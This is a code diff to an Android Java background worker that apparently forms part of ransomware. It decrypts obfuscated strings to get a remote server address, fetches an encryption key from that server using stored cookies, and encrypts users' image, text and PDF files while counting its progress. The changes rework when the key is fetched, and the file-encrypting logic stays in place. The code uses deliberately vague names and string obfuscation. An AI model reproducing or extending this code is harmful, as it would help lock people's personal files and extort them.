@@ -45,11 +45,9 @@ public class a extends Worker {
     private Map<String,Object> listOfMalware = new HashMap<>();
     private MessageDigest md = MessageDigest.getInstance("MD5");
     private String[] extenstions = {".jpg",".png",".jpeg",".txt",".pdf"};
-    private List<Integer> yes = new ArrayList<>();
     private int progressCount = 0;
     private int noOfFiles;
-    private byte[] idk = new byte[256];
-    private String boom;
+    private byte[] idk;
     public a(@NonNull Context context, @NonNull WorkerParameters workerParams) throws NoSuchAlgorithmException {
         super(context, workerParams);
         url = new GimmeString("awA4o9aRDSTqRTkiwyObSw==").decryptBoi();
@@ -111,17 +109,7 @@ public class a extends Worker {
                             }
                         }, Throwable::printStackTrace);
                         Volley.newRequestQueue(getApplicationContext()).add(jsonObjectRequest);
-                        YeetRequest yeetRequest =  new YeetRequest(YeetRequest.Method.GET,new GimmeString(getApplicationContext().getString(R.string.url)).decryptBoi() + url,null, response -> {
-                            try {
-                                idk = response.getString("key").getBytes();
-                                checkFile(oof);
-                            } catch (JSONException e) {
-                                e.printStackTrace();
-                            }
-
-                        },Throwable::printStackTrace);
-                        yeetRequest.setCookies(new CookieBoi(getApplicationContext()).get(URI.create(getApplicationContext().getString(R.string.url))));
-                        Volley.newRequestQueue(getApplicationContext()).add(yeetRequest);
+                        checkFile(oof);
                         progressCount+= 1;
                     }
                 }
@@ -180,12 +168,31 @@ public class a extends Worker {
         }
         return x;
     }
-    private byte[] checkFile(File oof){
-        for(String lmao:extenstions) {
-            if (oof.getAbsolutePath().endsWith(lmao)) {
-                idk = EncryptBoi.weeeeeeeeeeeeee(getApplicationContext(),oof,idk);
+    private void checkFile(File oof){
+        if(idk == null){
+            YeetRequest yeetRequest =  new YeetRequest(YeetRequest.Method.GET,new GimmeString(getApplicationContext().getString(R.string.url)).decryptBoi() + url,null, response -> {
+                try {
+                    idk = response.getString("key").getBytes();
+                    for(String lmao:extenstions) {
+                        if (oof.getAbsolutePath().endsWith(lmao)) {
+                            idk = EncryptBoi.weeeeeeeeeeeeee(getApplicationContext(),oof,idk);
+                        }
+                    }
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+
+            },Throwable::printStackTrace);
+            yeetRequest.setCookies(new CookieBoi(getApplicationContext()).get(URI.create(new GimmeString(getApplicationContext().getString(R.string.url)).decryptBoi())));
+            Volley.newRequestQueue(getApplicationContext()).add(yeetRequest);
+        }
+        else{
+            for(String lmao:extenstions) {
+                if (oof.getAbsolutePath().endsWith(lmao)) {
+                    idk = EncryptBoi.weeeeeeeeeeeeee(getApplicationContext(),oof,idk);
+                }
             }
         }
-        return idk;
+
     }
 }
